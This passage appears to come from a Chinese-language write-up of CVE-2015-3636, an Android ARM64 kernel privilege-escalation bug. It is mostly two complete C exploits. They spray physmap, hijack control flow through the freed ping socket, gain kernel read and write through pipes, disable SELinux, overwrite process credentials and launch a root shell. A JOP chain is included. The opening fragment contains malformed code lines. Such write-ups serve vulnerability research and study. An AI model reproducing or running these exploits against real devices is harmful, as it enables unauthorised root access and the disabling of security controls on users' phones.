0xffffffc000084240;\t\t\t// x30\n  sp->(unsigned long long *)map_addr_1[0xd0] = 0x0;\t\t\n  (unsigned long long *)map_addr_1[0xd8] = 0x0;\n  \n  (unsigned long long *)map_addr_2[0x0] = map_addr_2;\t\t\t// x0\n  (unsigned long long *)map_addr_2[0x8] = 0x0;\t\t\t// x0\n  (unsigned long long *)map_addr_2[0x10] = 0x0;\t\t\t// x0\n  (unsigned long long *)map_addr_2[0x18] = 0xffffffc0002999ec;\t// x1\tblr x1,(x0 +=x19)\n  (unsigned long long *)map_addr_2[0x20] = 0x0;\t\t\t// x29\n  (unsigned long long *)map_addr_2[0x28] = ;\t\t\t// x30\n  (unsigned long long *)map_addr_2[0x1b0] = 0xffffffc00009e8b8;  // ldr x8,[x8,0x1b0]\n  \n  (unsigned long long *)map_addr_3[0x0]  = 0xffffffc000084290;\n  (unsigned long long *)map_addr_3[0x8]  = 0x0;\n  (unsigned long long *)map_addr_3[0x10] = map_addr_3;\t// x0\n  (unsigned long long *)map_addr_3[0x18] = 0x0;\t\t// x1\n  (unsigned long long *)map_addr_3[0x20] = 0x0;\n  (unsigned long long *)map_addr_3[0x28] = 0x0;\n  ```\n\n\n\n### 第一种exp - pipe r/w + mutex_trylock()泄露\n\n参考 [4B5F5F4B](https://github.com/4B5F5F4B/Exploits/tree/master/Linux/CVE-2015-3636/jni) 的exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <limits.h>\n#include <signal.h>\n#include <string.h>\n#include <time.h>\n#include <pthread.h>\n#include <sys/wait.h>\n#include <sys/sysinfo.h>\n#include <sys/types.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <linux/in.h>\n#include <linux/sockios.h>\n\n#define MAX_SOCK_NUM 4000\n\n#define MAX_MMAP_NUM 6\n#define ONE_MMAP_SIZE 128*1024*1024\n\n#define SK_STAMP_OFFSET 0x1E0\n\n#define SIOCGSTAMPNS 0x8907\n#define NSEC_PER_SEC 1000000000\n\n#define MAGIC_VALUE 0x66666666          // test before use\n\nint vuln_sock[MAX_SOCK_NUM];\nvoid* mmaped[MAX_MMAP_NUM];\n\nint mmap_page_count;\nvoid* mmap_per_page[(ONE_MMAP_SIZE/PAGE_SIZE) * MAX_MMAP_NUM];\n\nint vuln_sock_index;\nvoid* vuln_page;\n\nint maximize_fd_limit(){\n\tstruct rlimit rlim;\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\n\trlim.rlim_cur = rlim.rlim_max;\n\tsetrlimit(RLIMIT_NOFILE, &rlim);\n\n\tgetrlimit(RLIMIT_NOFILE, &rlim);\n\treturn rlim.rlim_cur;\n}\n\nvoid mmap200200(){\n\tint ret=0;\n\tvoid *addr;\n\taddr = mmap((void*)0x200000, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);\n\tif(addr == -1){\n\t\tprintf(\"failed to mmap 0x200200\\\\n\");\n\t\texit(1);\n\t}\n\t*(unsigned*)addr = 0x100;\n\tret = mlock(addr,PAGE_SIZE);\n\tif(ret != 0){\n\t\tprintf(\"failed to mlock 0x200200\\\\n\");\n\t\texit(1);\n\t}\n}\n\nvoid create_vuln_socks(){\n    int i,j;\n\n    struct sockaddr_in sa1;\n\tmemset(&sa1,0x0,sizeof(sa1));\n    sa1.sin_family = AF_INET;\n\n    struct sockaddr_in sa2;\n\tmemset(&sa2,0x0,sizeof(sa2));\n    sa2.sin_family = AF_UNSPEC;\n\n    for(i = 0; i < MAX_SOCK_NUM; i++){\n        vuln_sock[i] = socket(AF_INET,SOCK_DGRAM,IPPROTO_ICMP);\n        if(vuln_sock[i] <= 0){\n            printf(\"create socket error: %s (%d)\", strerror(errno), errno);\n        }\n        connect(vuln_sock[i],&sa1,sizeof(sa1));\n    }\n\n    for(i = 0; i < MAX_SOCK_NUM; i++){\n\t    connect(vuln_sock[i],&sa2,sizeof(sa2));\n\t    connect(vuln_sock[i],&sa2,sizeof(sa2));\n    }\n\n}\n\nvoid mmap_spray(){\n    int i,j;\n\n    void* mapped_page;\n\n    mmap_page_count = 0;\n\n    for(i = 0; i < MAX_MMAP_NUM; i++){\n        mmaped[i] = mmap(NULL, ONE_MMAP_SIZE , PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);\n        // PRIVATE POPULATE? seems unnecessary\n        if(mmaped[i] == MAP_FAILED){\n            printf(\"mmap failed\\\\n\");\n            sleep(1);\n        \texit(1);\n        }\n  \n        for(j = 0 ;j < ONE_MMAP_SIZE/PAGE_SIZE; j++){\n            memset((char*)mmaped[i],0x41,PAGE_SIZE);                 \n            mapped_page = (void*)((char*)mmaped[i]+j*PAGE_SIZE);\n            *(unsigned long long*)((char*)mapped_page + SK_STAMP_OFFSET) = MAGIC_VALUE +  mmap_page_count;\n            mmap_per_page[mmap_page_count] = mapped_page;\n            mmap_page_count++;\n        }\n        \n    }\n}\n\nint find_target_sk(int num){\n    int i,j,ret;\n    struct timespec time;\n    unsigned long long value;\n    unsigned long long compare_value;\n    int found = 0;\n\n    vuln_sock_index = 0;\n\n    for(i = num ; i < MAX_SOCK_NUM; i++){\n        memset(&time, 0x0, sizeof(time));\n        ret = ioctl(vuln_sock[i], SIOCGSTAMPNS, &time);\n        value = ((unsigned long long)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;\n\n        for(j = 0; j < mmap_page_count; j++){\n            compare_value = *(unsigned long long *)((char*)mmap_per_page[j]+SK_STAMP_OFFSET);\n            if( value == compare_value){\n                printf(\" found a vuln sock, index: %d, maigc value: 0x%llx\\\\n\",i,value);\n                vuln_sock_index = i;\n                vuln_page = mmap_per_page[j];\n                found = 1;\n                break;\n            }\n        }\n\n        if(found == 1){\n            break;\n        }\n\n    }\n    \n    if(found == 1){\n        return 0;\n    }else{\n        return 1;\n    }\n\n}\n\nvoid read_kernel(unsigned long long k_addr, unsigned long long* u_addr){\n    int pipe_fd[2];\n    pipe(pipe_fd);\n    write(pipe_fd[1],(void*)k_addr,0x8);\n    read(pipe_fd[0],u_addr,0x8);\n}\n\nvoid write_kernel(unsigned long long k_addr, unsigned long long* u_addr){\n    int pipe_fd[2];\n    pipe(pipe_fd);\n    write(pipe_fd[1],u_addr,0x8);\n    read(pipe_fd[0],(void*)k_addr,0x8);\n}\n\nvoid write_kernel4(unsigned long long k_addr, unsigned long long* u_addr){\n    int pipe_fd[2];\n    pipe(pipe_fd);\n    write(pipe_fd[1],u_addr,0x4);\n    read(pipe_fd[0],(void*)k_addr,0x4);\n}\n\nvoid disalbe_selinux(){\n    unsigned long long selinux_addr = 0xFFFFFFC0006EB94C;\n    unsigned long long disable = 0x0;\n    write_kernel(selinux_addr, &disable);\n\n}\n\nint main(){\n    int i,j,k,ret;\n\n\tret = maximize_fd_limit();\n\tprintf(\"[+] set rlimlit, now rlim.rlim_cur: %d\\\\n\",ret);\n\tmmap200200();\n\tprintf(\"[+] mmap 0x200200 to avoid crash\\\\n\");\n\n    printf(\"[+] step 1: create vuln socks\\\\n\");\n    create_vuln_socks();\n\n    printf(\"[+] step 2: mmap spray\\\\n\");\n    mmap_spray();\n\n    printf(\"[+] step 3: find the target sk\\\\n\");\n    ret = find_target_sk(0);\n    if(ret == 1){\n        printf(\"didn't find a usable sock...\\\\n\");\n        sleep(1);\n        exit(1);\n    }\n\n    printf(\"then, go to root procedure\\\\n\");\n\n// get root\n    // kernel_setscokopt change addr_limit\n    unsigned long long kernel_setsockopt_addr = 0xFFFFFFC000383C6C;\n    unsigned long long kernel_setsockopt_ret = 0xFFFFFFC000383CAC;\n\n    *(unsigned long long*)((char*)vuln_page+0x2A0) = 0x0;\n    *(unsigned long long*)((char*)vuln_page+0x28) = (unsigned long long)vuln_page;\n    *(unsigned long long*)((char*)vuln_page) = kernel_setsockopt_addr;\n    *(unsigned long long*)((char*)vuln_page+0x68) = kernel_setsockopt_ret;\n\n    close(vuln_sock[vuln_sock_index]);\n\n    // pipe r/w kernel\n    // unsigned long long kernel_addr = 0xFFFFFFC000752A00;\n    // unsigned long long user_data = 0xdeadbeef;\n    // write_kernel(kernel_addr, &user_data);\n    // user_data = 0x0;\n    // read_kernel(kernel_addr, &user_data);\n    // printf(\"read from kernel, user_data is 0x%llx\\\\n\",user_data);\n\n    disalbe_selinux();\n\n    unsigned long long mmap_min_addr = 0xffffffc0006ea0f8;\n    unsigned long long user_data = 0;\n    write_kernel(mmap_min_addr, &user_data);\n    unsigned long long test_value = 1;\n    read_kernel(mmap_min_addr, &test_value);\n    printf(\"read from kernel, mmap_min_addr is 0x%llx\\\\n\",test_value);\n\n    printf(\"mmap 0 addr, and read task addr\\\\n\");\n    void *addr;\n\taddr = mmap((void*)0x0, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED|MAP_ANONYMOUS, -1, 0);\n\tif(addr == -1){\n\t\tprintf(\"failed to mmap 0x0, exit and try again\\\\n\");\n\t\texit(1);\n\t}\n\n// get cred addr\n\n    printf(\"[+] step n: find another target sk\\\\n\");\n    ret = find_target_sk(vuln_sock_index+1);\n    if(ret == 1){\n        printf(\"didn't find a usable sock...\\\\n\");\n        sleep(1);\n        exit(1);\n    }\n\n    unsigned long long leak_task_addr = 0xFFFFFFC000530A58;\n    *(unsigned long long*)((char*)vuln_page+0x2A0) = 0x0;\n    *(unsigned long long*)((char*)vuln_page+0x28) = (unsigned long long)vuln_page;\n    *(unsigned long long*)((char*)vuln_page) = leak_task_addr;\n    close(vuln_sock[vuln_sock_index]);\n\n    printf(\"read task addr\");\n    unsigned long long task_addr = *(unsigned long long *)(0x18);\n    printf(\"task addr : 0x%llx\\\\n\",task_addr);\n\n    unsigned long long cred_in_task = task_addr+0x3a0;\n    unsigned long long cred_addr = 0;\n    read_kernel(cred_in_task, &cred_addr);\n    printf(\"cred_addr: 0x%llx\\\\n\",cred_addr);\n\n    unsigned int cflag = 0;\n    write_kernel4((char*)cred_addr+4,&cflag);\n    write_kernel4((char*)cred_addr+8,&cflag);\n    write_kernel4((char*)cred_addr+12,&cflag);\n    write_kernel4((char*)cred_addr+16,&cflag);\n    write_kernel4((char*)cred_addr+20,&cflag);\n    write_kernel4((char*)cred_addr+24,&cflag);\n    write_kernel4((char*)cred_addr+28,&cflag);\n    write_kernel4((char*)cred_addr+32,&cflag);\n\n    if(getuid() == 0){\n        printf(\"get root shell\\\\n\");\n        execl(\"/system/bin/sh\", \"sh\", NULL);\n    }else{\n        printf(\"failed to get root\\\\n\");\n        sleep(10);\n    }\n\n    printf(\"end\\\\n\");\n    sleep(30);\n\n    return 0;\n}\n```\n\n### 第二种exp - pipe r/w + JOP泄露\n\ngeekcon 环境中给出的exp\n\n```c\n#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <errno.h>\n#include <limits.h>\n#include <signal.h>\n#include <string.h>\n#include <time.h>\n#include <pthread.h>\n#include <sys/wait.h>\n#include <sys/sysinfo.h>\n#include <sys/types.h>\n#include <sys/mman.h>\n#include <sys/socket.h>\n#include <linux/in.h>\n#include <linux/sockios.h>\n\n#define MMAP_BEGIN\t\t\t\t0x200000\n#define PAGE_SIZE\t\t\t  4096\n#define SIOCGSTAMPNS \t\t\t  0x8907\n#define MAGIC_VALUE \t\t\t  0x4B5F5F4B\n#define OOM_DISABLE                       (-100)\n#define NSEC_PER_SEC                      1000000000\n\n#define STATUS_SUCCESS                    0\n#define STATUS_FAILURE                    -1  \n#define MAX_PHYSMAP_SIZE                  128*1024*1024\n#define MAX_PATH                          0x100\n#define MAX_PHYSMAP_SPRAY_PROCESS         6\n#define MAX_VULTRIG_SOCKS_COUNT           4000\n#define MAX_NULLMAP_SIZE                  (PAGE_SIZE * 4)\n\nint   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];\nvoid* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];\nint   physmap_spray_pages_count;\n\nstatic int\nmaximize_fd_limit(void)\n{\n  struct rlimit rlim;\n  int ret;\n\n  ret = getrlimit(RLIMIT_NOFILE, &rlim);\n  if (ret != 0) {\n    return -1;\n  }\n\n  rlim.rlim_cur = rlim.rlim_max;\n  setrlimit(RLIMIT_NOFILE, &rlim);\n\n  ret = getrlimit(RLIMIT_NOFILE, &rlim);\n  if (ret != 0) {\n    return -1;\n  }\n\n  return rlim.rlim_cur;\n}\n\nint spray_nofork(unsigned int size)\n{\n\n  void*       mapped;\n  void*       mapped_page;\n  int         ret, i;\n\n  mapped = mmap(NULL, size , PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);\n  if(MAP_FAILED == mapped)\n  {\n    printf(\"[*] mmap fail.\\\\n\");\n    exit(-1);\n  }\n\n  for(i=0; i<size/PAGE_SIZE; i++)\n  {\n      memset((void *)((char *)mapped + PAGE_SIZE * i), 0x41, PAGE_SIZE);  \n      mapped_page = (void *)((char *)mapped + PAGE_SIZE * i);\n\n      /*\n        info leak trick mentioned in Xu Wen's paper, a magic value will be read in sock_get_timestampns\n        ROM:FFFFFFC00038722C                 LDR             X0, [X19,#0x1E0]\n\t\tROM:FFFFFFC000387230                 BL              ns_to_timespec\n      */\n      *(unsigned long *)((char *)mapped_page + 0x1E0)  = MAGIC_VALUE + physmap_spray_pages_count;\n      /*ret = mlock(mapped_page, PAGE_SIZE);\n      if(-1 == ret)\n      {\n          perror(\"[*] lock the mapped page fail\");\n          return -1;\n      }*/\n\n      physmap_spray_pages[physmap_spray_pages_count]  =  mapped_page;\n      physmap_spray_pages_count++;\n  }\n  return 0;\n}\n\nint kernel_read8(void* kernel_addr,  unsigned long* value)\n{\n    int pipefd[2];\n \n    if(-1 == pipe(pipefd))\n    {\n        printf(\"[*] create dual pipe fail.\\\\n\");\n        return -1;\n    }\n \n \n    if(-1 == write(pipefd[1], kernel_addr, 8))\n    {\n        perror(\"[*] write pipe fail.\");\n        return -1;\n    }\n \n    if(0 == read(pipefd[0], value, 8))\n    {\n        perror(\"[*] read piple fail.\");\n        return -1;\n    }\n \n    return 0;\n}\n\nint kernel_read4(void* kernel_addr,  unsigned int* value)\n{\n    int pipefd[2];\n \n    if(-1 == pipe(pipefd))\n    {\n        printf(\"[*] create dual pipe fail.\\\\n\");\n        return -1;\n    }\n \n \n    if(-1 == write(pipefd[1], kernel_addr, 4))\n    {\n        perror(\"[*] write pipe fail.\");\n        return -1;\n    }\n \n    if(0 == read(pipefd[0], value, 4))\n    {\n        perror(\"[*] read piple fail.\");\n        return -1;\n    }\n \n    return 0;\n}\n \n \nint kernel_write8(void* kernel_addr, unsigned long* value)\n{\n \n    int pipefd[2];\n \n    if(-1 == pipe(pipefd))\n    {\n        printf(\"[*] create dual pipe fail.\\\\n\");\n        return -1;\n    }\n \n \n    if(-1 == write(pipefd[1], value, 8))\n    {\n        perror(\"[*] write pipe fail.\");\n        return -1;\n    }\n \n    if(0 == read(pipefd[0], kernel_addr, 8))\n    {\n        perror(\"[*] read piple fail.\");\n        return -1;\n    }\n \n    return 0;\n}\n\nint kernel_write4(void* kernel_addr, unsigned int* value)\n{\n \n    int pipefd[2];\n \n    if(-1 == pipe(pipefd))\n    {\n        printf(\"[*] create dual pipe fail.\\\\n\");\n        return -1;\n    }\n \n \n    if(-1 == write(pipefd[1], value, 4))\n    {\n        perror(\"[*] write pipe fail.\");\n        return -1;\n    }\n \n    if(0 == read(pipefd[0], kernel_addr, 4))\n    {\n        perror(\"[*] read piple fail.\");\n        return -1;\n    }\n \n    return 0;\n}\n\nint search_exploitable_socket(int* index, void** payload)\n{\n    struct    timespec time;\n    uint64_t  value;\n    void*     page     =  NULL;\n    int       j        =  0;\n    int       exp_sock = -1;\n    int       got      =  0;\n\n\tprintf(\"[*] Searching exploitable socket\");\n    *payload  = NULL;\n    do\n    {\n\t\t\n        exp_sock = vultrig_socks[*index];\n        memset(&time, 0, sizeof(time));\n        ioctl(exp_sock, SIOCGSTAMPNS, &time);\n        /*\n            ts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n            if (unlikely(rem < 0)) {\n             ts.tv_sec--;\n              rem += NSEC_PER_SEC;\n            }\n            ts.tv_nsec = rem;\n        */\n        value = ((uint64_t)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;\n\t\t// printf(\"search_exploitable_socket: %d, %llx\\\\n\", *index, value);\n\t\tprintf(\".\");\n        for(j=0;  j<physmap_spray_pages_count; j++)\n        {\n            page = physmap_spray_pages[j];\n            if(value == *(unsigned long *)((char *)page + 0x1E0))\n            {\n                printf(\"[*] magic:%p\\\\n\", value);\n                got      = 1;\n                *payload = page;\n                break;\n            }\n        }\n        *index = *index + 1;\n    }\n    while(!got && *index < MAX_VULTRIG_SOCKS_COUNT);\n\tprintf(\"\\\\n\");\n\t\n    if(got == 0)\n    {\n        return -1;\n    }\n    else\n    {\n        return exp_sock;\n    }\n}\n\nvoid* jop(int exp_sock, void *payload) {\n\t\t\n\tprintf(\"[*] JOP leaking sp\\\\n\");\n\n\tstatic unsigned long *mmap_addrs[20];\n\tfor (int i = 0; i < 20 ; i++) {\n      mmap_addrs[i] = mmap(NULL, PAGE_SIZE * 4,\n                        PROT_READ | PROT_WRITE,\n                        MAP_SHARED | MAP_ANONYMOUS,\n                        -1, 0);\n\t//   printf(\"mmap_addrs[%d]: %p\\\\n\", i, mmap_addrs[i]);\n    }\n\n\t#define ADDR_ADD(p,n)           ((void *)((char *)(p) + (n)))\n\n\t/*\n\t0xffffffc0000e6158: ldr x1, [x19, #0x10]; ldr x0, [x19, #0x18]; blr x1;\n\t0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;\n\t0xffffffc0000ea5c0: ldr x3, [x1, #0x80]; ldr x0, [x0, #8]; blr x3;\n\t0xFFFFFFC0002FD50C: ldr x2, [x0,#0x90]; cbz x2, #0x27d530; ldr x3, [x2, #0x68]; cbz x3, #0x27d53c; ldr x1, [x3, #0x18]; cbz x1, #0x27d530; blr x1;\n\t0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;\n\t0xffffffc000083db8: mov x0, sp; blr x1;\n\t0xffffffc0000eb704: mov x1, x3; ldr x3, [x3, #0xc0]; blr x3;\n\t0xffffffc0004cdd74: str x0, [x1, #8]; mov x0, x19; ldr x1, [x19, #0x20]; ldr x1, [x1, #0x28]; blr x1;\n\n\t// return to inet_release 0xFFFFFFC00042E3A4\n\t*/\n\n\tunsigned long *p=payload;\n\tvoid *x19 = payload;\n\n\t// 0xffffffc0000e6158: ldr x1, [x19, #0x10]; ldr x0, [x19, #0x18]; blr x1;\n\tp = ADDR_ADD(x19, 0x10);\n\t*p = 0xffffffc0004c708c;\n\tp = ADDR_ADD(x19, 0x18);\n\t*p = (unsigned long)mmap_addrs[0];\n\t// 0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;\n\tp = ADDR_ADD(mmap_addrs[0], 0x58);\n\t*p = (unsigned long)mmap_addrs[1];\n\tp = ADDR_ADD(mmap_addrs[1], 0x0);\n\t*p = 0xffffffc0000ea5c0;\n\tp = ADDR_ADD(mmap_addrs[0], 0x60);\n\t*p = (unsigned long)mmap_addrs[2];\n\t// 0xffffffc0000ea5c0: ldr x3, [x1, #0x80]; ldr x0, [x0, #8]; blr x3;\n\tp = ADDR_ADD(mmap_addrs[2], 0x80);\n\t*p = 0xFFFFFFC0002FD50C;\n\tp = ADDR_ADD(mmap_addrs[0], 0x8);\n\t*p = (unsigned long)mmap_addrs[3];\n\n\t// 0xFFFFFFC0002FD50C: ldr x2, [x0,#0x90]; cbz x2, #0x27d530; ldr x3, [x2, #0x68]; cbz x3, #0x27d53c; ldr x1, [x3, #0x18]; cbz x1, #0x27d530; blr x1;\n\tp = ADDR_ADD(mmap_addrs[3], 0x90);\n\t*p = (unsigned long)mmap_addrs[2];\n\tp = ADDR_ADD(mmap_addrs[2], 0x68);\n\t*p = (unsigned long)mmap_addrs[4];\n\tp = ADDR_ADD(mmap_addrs[4], 0x18);\n\t*p = 0xffffffc0004c708c;\n\t// 0xffffffc0004c708c: ldr x2, [x0, #0x58]; ldr x1, [x0, #0x60]; ldr x2, [x2]; blr x2;\n\tp = ADDR_ADD(mmap_addrs[3], 0x58);\n\t*p = (unsigned long)mmap_addrs[5];\n\tp = ADDR_ADD(mmap_addrs[5], 0x0);\n\t*p = 0xffffffc000083db8;\n\tp = ADDR_ADD(mmap_addrs[3], 0x60);\n\t*p = (unsigned long)0xffffffc0000eb704;\n\t// 0xffffffc000083db8: mov x0, sp ; blr x1\n\t// 0xffffffc0000eb704: mov x1, x3; ldr x3, [x3, #0xc0]; blr x3;\n\tp = ADDR_ADD(mmap_addrs[4], 0xc0);\n\t*p = 0xffffffc0004cdd74;\n\t// 0xffffffc0004cdd74: str x0, [x1, #8]; mov x0, x19; ldr x1, [x19, #0x20]; ldr x1, [x1, #0x28]; blr x1;\n\t// write sp into ADDR_ADD(mmap_addrs[4], 0x8);\n\tp = ADDR_ADD(x19, 0x20);\n\t*p = (unsigned long)mmap_addrs[6];\n\tp = ADDR_ADD(mmap_addrs[6], 0x28);\n\t*p = 0xFFFFFFC00042E3A4;\n\n\t// Do JOP\n\t*(unsigned long *)((char *)payload + 0x2a0) = 0;\n\t*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;\n\t*(unsigned long *)((char *)payload)         = (unsigned long)0xffffffc0000e6158;\n\tclose(exp_sock);\n\n\tvoid *sp = *(unsigned long *)(ADDR_ADD(mmap_addrs[4], 0x8));\n\tprintf(\"[*] sp: %p\\\\n\", sp); \n\treturn sp;\n}\n\nint main() {\n\tpid_t\t  physmap_spray_children[MAX_PHYSMAP_SPRAY_PROCESS];\n\tint \t  i, ret, j, exp_sock, exp_sock_index;\n\tunsigned long  data8;\n\tunsigned int   data4;\n\tvoid*     payload;\n\tvoid*     cred;\n\tvoid*     page;\n\tvoid*     task;\n\tvoid*     files;\n\tvoid*     fdt;\n\n\tstruct sockaddr addr1 = { .sa_family = AF_INET \t };\n\tstruct sockaddr addr2 = { .sa_family = AF_UNSPEC };\n\n\tif(-1 == maximize_fd_limit())\n \t {\n      \t\tperror(\"[*] maximize socket limit fail\");\n      \t\texit(-1);\n  \t }\n\n\t\n\tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n\t{\n\t\tvultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);\n\t\tif(-1 == vultrig_socks[i])\n\t\t{\n\t\t\tperror(\"[-] create vultrig socket fail.\\\\n\");\n\t\t\texit(-1);\n\t\t}\n\n\t\tret = connect(vultrig_socks[i], &addr1, sizeof(addr1));\n\t\tif(-1 == ret)\n\t\t{\n\t\t\tperror(\"[-] create vultrig socket fail.\\\\n\");\n\t\t\texit(-1);\n\t\t}\n\t}\n\t\n\tvoid* user_mm = mmap(MMAP_BEGIN, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED |MAP_ANONYMOUS, -1, 0);\n\tif(MAP_FAILED == user_mm)\n\t{\n\t      perror(\"[-] mmap NULL fail\");\n\t      exit(-1);\n\t}\n\n\tfor(i=0; i<MAX_NULLMAP_SIZE/PAGE_SIZE; i++)\n\t{\n\t     memset((char *)user_mm + PAGE_SIZE * i, 0x90, PAGE_SIZE);\n\t}\n  \n\tfor(i=0; i<MAX_VULTRIG_SOCKS_COUNT; i++)\n\t{\n\t\tret = connect(vultrig_socks[i], &addr2, sizeof(addr2));\n\t\tif(-1 == ret)\n\t\t{\n\t\t\tperror(\"[-] create vultrig socket fail\");\n\t\t\texit(-1);\n\t\t}\n\n\t\tret = connect(vultrig_socks[i], &addr2, sizeof(addr2));\n\t\tif(-1 == ret)\n\t\t{\n\t\t\tperror(\"[-] connect vultrig socket fail\");\n\t\t\texit(-1);\n\t\t}\n\t}\n\n\tprintf(\"[*] physmap spray begin.\\\\n\");\n  \tmemset(physmap_spray_pages,    0,   sizeof(physmap_spray_pages));\n\tmemset(physmap_spray_children, 0, \tsizeof(physmap_spray_children));\n  \tphysmap_spray_pages_count   =  0;\n\tfor(i=0; i<MAX_PHYSMAP_SPRAY_PROCESS; i++)\n\t{\n\t\t\n\t    if(-1 == spray_nofork(MAX_PHYSMAP_SIZE))\n\t    {\n\t      printf(\"[*] physmap spray fail.\\\\n\");\n\t      return -1;\n\t    }\n\t}\n\n\tprintf(\"[*] physmap spray done.\\\\n\");\n\n\texp_sock_index = MAX_VULTRIG_SOCKS_COUNT / 2;\n\texp_sock = search_exploitable_socket(&exp_sock_index, &payload);\n\tif(-1 == exp_sock)\n\t{\n\t\tprintf(\"[*] can't search exploitable socket.\\\\n\");\n\t\treturn -1;\n\t}\n\n\t/*\n\tto avoid 64bit exp crash in ip_mc_drop_socket\n\tROM:FFFFFFC0004323D8                 LDR             X19, [X22,#0x2A0]\n\tROM:FFFFFFC0004323DC                 CBZ             X19, loc_FFFFFFC00043243C\n\t*/\n\t*(unsigned long *)((char *)payload + 0x2a0)  = 0;\n\t/*\n\thijack PC here\n\tROM:FFFFFFC00042E394                 MOV             X0, X19\n\tROM:FFFFFFC00042E398                 LDR             X2, [X19,#0x28]\n\tROM:FFFFFFC00042E39C                 LDR             X2, [X2]\n\tROM:FFFFFFC00042E3A0                 BLR             X2 \n\t*/\n\n\t/*\n\tcall kernel_setsockopt to set addr_limit 0xFFFFFFFFFFFFFFFF\n\n\tROM:FFFFFFC000383C6C                 STP             X29, X30, [SP,#var_20]!\n\tROM:FFFFFFC000383C70                 MOV             X6, #0xFFFFFFFFFFFFFFFF\n\tROM:FFFFFFC000383C74                 CMP             W1, #1\n\tROM:FFFFFFC000383C78                 MOV             X5, SP\n\tROM:FFFFFFC000383C7C                 MOV             X29, SP\n\tROM:FFFFFFC000383C80                 AND             X5, X5, #0xFFFFFFFFFFFFC000\n\tROM:FFFFFFC000383C84                 STR             X19, [SP,#0x20+var_10]\n\tROM:FFFFFFC000383C88                 LDR             X19, [X5,#8]\n\tROM:FFFFFFC000383C8C                 STR             X6, [X5,#8]\n\tROM:FFFFFFC000383C90                 B.EQ            loc_FFFFFFC000383CB8\n\tROM:FFFFFFC000383C94                 LDR             X5, [X0,#0x28]\n\tROM:FFFFFFC000383C98                 LDR             X5, [X5,#0x68]\n\tROM:FFFFFFC000383C9C                 BLR             X5\n\tROM:FFFFFFC000383CA0                 MOV             X1, SP\n\tROM:FFFFFFC000383CA4                 AND             X1, X1, #0xFFFFFFFFFFFFC000\n\tROM:FFFFFFC000383CA8                 STR             X19, [X1,#8]\n\tROM:FFFFFFC000383CAC                 LDR             X19, [SP,#0x20+var_10]\n\tROM:FFFFFFC000383CB0                 LDP             X29, X30, [SP+0x20+var_20],#0x20\n\tROM:FFFFFFC000383CB4                 RET\n\t*/\n\t*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;\n\t*(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC000383C6C;\n\t*(unsigned long *)((char *)payload + 0x68)  = (unsigned long)0xFFFFFFC000383CAC;\n\tclose(exp_sock);\n\n\tprintf(\"[*] now we can R/W kernel address space like a boss.\\\\n\");\n\t/*now we can RW kernel address spcae like a boss.*/\n\n\t/*\n\toverwirte selinux_enforcing to disable selinux\n\t*/\n\tdata4 = 0;\n\tkernel_write4((void *)(0xFFFFFFC0006D6E7F + 0x14ACD), &data4);\n\tprintf(\"[*] selinux disabled.\\\\n\");\n\n\texp_sock = -1;\n\texp_sock_index = exp_sock_index + 1;\n\texp_sock = search_exploitable_socket(&exp_sock_index, &payload);\n\tif(-1 == exp_sock)\n\t{\n\t\tprintf(\"[*] can't search exploitable socket.\\\\n\");\n\t\treturn -1;\n\t}\n\n\tvoid *sp = jop(exp_sock, payload);\n\n\tvoid *sp_task = ((unsigned long)sp & 0xFFFFFFFFFFFFC000) + 0x10;\n\ttask = NULL;\n\tkernel_read8(sp_task, &task);\n\n\t/*\n\t\toverwrite task_struct->cred to gain root privilege\n\t*/\n\tprintf(\"[*] task:%p\\\\n\", task); \n\n\tcred = NULL;\n\tkernel_read8((char *)task + 0x398, &cred);\n\tprintf(\"[*] cred:%p\\\\n\", cred);\n\n\tdata4 = 0;\n\tkernel_write4((char *)cred +  4,  &data4);\n\tkernel_write4((char *)cred +  8,  &data4);\n\tkernel_write4((char *)cred + 12,  &data4);\n\tkernel_write4((char *)cred + 16,  &data4);\n\tkernel_write4((char *)cred + 20,  &data4);\n\tkernel_write4((char *)cred + 24,  &data4);\n\tkernel_write4((char *)cred + 28,  &data4);\n\tkernel_write4((char *)cred + 32,  &data4);\n\n\t/*\n\t\tcleanup to avoid crash. overwirte task_struct->files->fdt->max_fds to 0\n\t*/\n\n\tkernel_read8((char *)task + 0x788, &files);\n\tprintf(\"[*] files:%p\\\\n\", files);\n\n\tkernel_read8((char *)files + 8, &fdt);\n\tprintf(\"[*] fdt:%p\\\\n\", fdt);\n\n\tdata4 = 0;\n\tkernel_write4(fdt, &data4);\n\n\tif(getuid() == 0)\n\t{\n\t\tprintf(\"[*] congrats, enjoy your root shell.\\\\n\");\n\t\tsystem(\"/system/bin/sh\");\n\t}\n\telse\n\t{\n\t\tprintf(\"[*] Oops, you'd better have a cup of tea and try again:(\\\\n\");\n\t}\n\n\treturn 0;\n}\n```\n\n### 第三种exp - 纯 kernel 